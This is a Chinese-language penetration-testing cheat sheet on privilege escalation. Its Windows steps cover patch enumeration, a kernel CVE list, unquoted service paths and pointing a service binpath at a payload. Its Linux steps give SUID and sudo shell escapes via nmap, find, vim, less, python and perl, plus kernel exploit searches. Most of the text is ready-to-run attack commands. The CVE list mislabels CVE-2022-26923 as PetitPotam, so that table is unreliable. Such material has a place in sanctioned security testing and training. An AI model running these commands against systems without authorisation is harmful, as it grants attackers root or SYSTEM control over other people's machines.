# 权限提升

### 5.1 Windows 提权

#### 5.1.1 内核漏洞提权

**漏洞检测**
```powershell
# 系统信息
systeminfo > systeminfo.txt

# 补丁列表
wmic qfe list

# 使用 Windows-Exploit-Suggester
python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt
```

**常见内核漏洞**
```
CVE-2021-1675 / CVE-2021-34527  PrintNightmare   # RCE/提权
CVE-2022-26923                   PetitPotam       # NTLM Relay
CVE-2022-26809                   RPCSS            # RCE
CVE-2021-41379                   Windows Installer# 提权
CVE-2020-0787                    BITS             # 提权
MS16-032                          Secondary Logon  # 提权
```

#### 5.1.2 服务配置错误提权

**未引用的服务路径**
```powershell
# 查找未引用的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *
```

**服务权限利用**
```powershell
# 修改服务路径
sc config vulnerable_svc binpath= "C:\Users\Public\payload.exe"
sc start vulnerable_svc
```

### 5.2 Linux 提权

#### 5.2.1 SUID 提权

```bash
# 查找 SUID 文件
find / -perm -4000 2>/dev/null

# 常见 SUID 利用（参考 GTFOBins）
# nmap
nmap --interactive
!sh

# find
find . -exec /bin/sh \;

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# perl
perl -e 'exec "/bin/sh";'

# cp/mv
# 复制 /etc/passwd 修改后替换
```

#### 5.2.2 sudo 配置错误

```bash
# 查看 sudo 权限
sudo -l

# 常见 sudo 利用（参考 GTFOBins）
# vim
sudo vim -c '!sh'

# less/more
sudo less /etc/passwd
!/bin/sh

# find
sudo find / -exec /bin/sh \;

# env
sudo env /bin/sh

# python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### 5.2.3 内核漏洞提权

```bash
# 检查内核版本
uname -r

# 搜索漏洞
searchsploit linux kernel <版本号> privilege escalation

# Dirty Pipe (CVE-2022-0847)       - Linux 5.8+
# Dirty Cred / OverlayFS           - Linux 5.x
```
